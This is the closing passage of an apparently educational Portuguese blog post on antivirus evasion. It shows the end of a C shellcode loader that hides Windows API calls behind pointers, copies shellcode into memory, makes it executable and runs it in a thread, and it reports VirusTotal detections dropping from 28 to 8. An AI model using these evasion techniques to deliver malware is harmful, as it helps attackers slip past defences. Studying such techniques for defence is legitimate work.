        <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">pVA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>


        <span class="n">pRM</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

        <span class="n">rx</span> <span class="o">=</span> <span class="n">pVP</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span> <span class="n">rx</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
                <span class="kr">thread</span> <span class="o">=</span> <span class="n">pCT</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="n">pWFSO</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ao submeter no VirusTotal novamente, abaixamos a identificação de ameaça de <strong>17</strong> para <strong>8</strong> antivírus somente com as implementações feitas.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724165453.png" alt="" /></p><ul><li><a href="https://www.virustotal.com/gui/file/01bff6414d74483a0c1b39e1977e0c8e14cfdc26f00c2e6041d95f86d022a0ab/detection">https://www.virustotal.com/gui/file/01bff6414d74483a0c1b39e1977e0c8e14cfdc26f00c2e6041d95f86d022a0ab/detection</a></ul><p>Estas técnicas, como dito no início, não são uma bala de prata, porém servem como direção para entender alguns procedimentos que os AVs utilizam para analisar um executável. De fato, seria extremamente difícil zerar o contador do VirusTotal, porém, só com as técnicas apresentadas neste artigo, abaixamos de <strong>28</strong> para <strong>8</strong> detecções, uma quantidade significativa.</p><h1 id="conclusão">Conclusão</h1><p>Neste artigo, exploramos diversas técnicas de evasão de antivírus, abordando desde conceitos básicos até implementações práticas. Demonstramos como a ofuscação de chamadas de função, o uso de criptografia para esconder <em>payloads</em> e a manipulação de APIs podem reduzir significativamente a detecção por motores de antivírus.</p><p>Embora nenhuma técnica de evasão seja infalível, e os desenvolvedores de antivírus estejam constantemente aprimorando suas ferramentas para detectar novas ameaças, entender essas abordagens é essencial para os profissionais de segurança cibernética. Isso não apenas fortalece a capacidade de criar soluções de segurança mais robustas, mas também permite antecipar e neutralizar possíveis ameaças de maneira mais eficaz.</p><p>Reduzir a detecção de 28 para 8 antivírus no VirusTotal é um resultado significativo, destacando a eficácia das técnicas discutidas. No entanto, é crucial lembrar que a evasão de AV é uma área de estudo em constante evolução, exigindo aprendizado contínuo e adaptação às novas estratégias defensivas.</p><p>Através deste artigo, espero ter fornecido uma base para a compreensão das técnicas de evasão de antivírus e inspirado uma reflexão sobre a importância de se manter atualizado com as práticas mais recentes de segurança cibernética. Incentivamos os leitores a continuarem explorando, testando e contribuindo para o campo, fortalecendo assim a comunidade de segurança cibernética como um todo.</p><h1 id="referências">Referências</h1><ul><li><a href="https://h41stur.com/posts/shellcoding101/#shellcode-com-endere%C3%A7os-din%C3%A2micos">https://h41stur.com/posts/shellcoding101/#shellcode-com-endere%C3%A7os-din%C3%A2micos</a><li><a href="https://www.virustotal.com/gui/file/60367827bdd3a28562341f6ce9faf7972a72e266bc5c331b6804fc2fbb2d61da?nocache=1">https://www.virustotal.com/gui/file/60367827bdd3a28562341f6ce9faf7972a72e266bc5c331b6804fc2fbb2d61da?nocache=1</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject</a><li><a href="https://www.virustotal.com/gui/file/03c4fc6d781f0dd6725b8df809bab0884b33bd92b59a2ee2e674288fa367e9fd/detection">https://www.virustotal.com/gui/file/03c4fc6d781f0dd6725b8df809bab0884b33bd92b59a2ee2e674288fa367e9fd/detection</a><li><a href="https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/detection">https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/detection</a><li><a href="https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/details">https://www.virustotal.com/gui/file/008b76ba3c5f278c5e021c52d2d78b8d0feea242b711017c65a53ae0537a66af/details</a><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc</a><li><a href="https://www.virustotal.com/gui/file/01bff6414d74483a0c1b39e1977e0c8e14cfdc26f00c2e6041d95f86d022a0ab/detection">https://www.virustotal.com/gui/file/01bff6414d74483a0c1b39e1977e0c8e14cfdc26f00c2e6041d95f86d022a0ab/detection</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/estudos/'>Estudos</a>, <a href='/categories/evas%C3%A3o-de-antiv%C3%ADrus/'>Evasão de Antivírus</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >Shellcoding</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >Shellcode</a> <a href="/tags/windows-api/" class="post-tag no-text-decoration" >Windows API</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >Kernel</a> <a href="/tags/evas%C3%A3o-de-antiv%C3%ADrus/" class="post-tag no-text-decoration" >Evasão de Antivírus</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Evasão de Antivírus - Princípios Gerais e Abordagens Específicas - H41stur&url=https://h41stur.github.io/posts/evasao-av/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Evasão de Antivírus - Princípios Gerais e Abordagens Específicas - H41stur&u=https://h41stur.github.io/posts/evasao-av/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Evasão de Antivírus - Princípios Gerais e Abordagens Específicas - H41stur&url=https://h41stur.github.io/posts/evasao-av/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/evasao-av/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/shellcoding101/"><div class="card-body"> <span class="timeago small" >Jul 18, 2024<i class="unloaded">2024-07-18T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcoding 101</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos os fundamentos do desenvolvimento de shellcodes, focando principalmente no ambiente Windows e na manipulação de endereços dinâmicos. O shellcoding envolve escrever...</p></div></div></a></div><div class="card"> <a href="/posts/get-process/"><div class="card-body"> <span class="timeago small" >Aug 6, 2024<i class="unloaded">2024-08-06T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enumerando Processos pelo Nome</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos como utilizar as APIs do Windows para enumerar processos em execução, focando nas funções CreateToolhelp32Snapshot, Process32First e Process32Next. Discutimos a im...</p></div></div></a></div><div class="card"> <a href="/posts/process-injection/"><div class="card-body"> <span class="timeago small" >Aug 7, 2024<i class="unloaded">2024-08-07T01:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Process Injection 101</h3><div class="text-muted small"><p> TL;DR Neste artigo, exploramos a técnica de Process Injection, uma abordagem avançada que permite a injeção de código em processos legítimos em execução. Amplamente utilizada em cenários de segu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/shellcoding101/" class="btn btn-outline-primary" prompt="Older"><p>Shellcoding 101</p></a> <a href="/posts/get-process/" class="btn btn-outline-primary" prompt="Newer"><p>Enumerando Processos pelo Nome</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
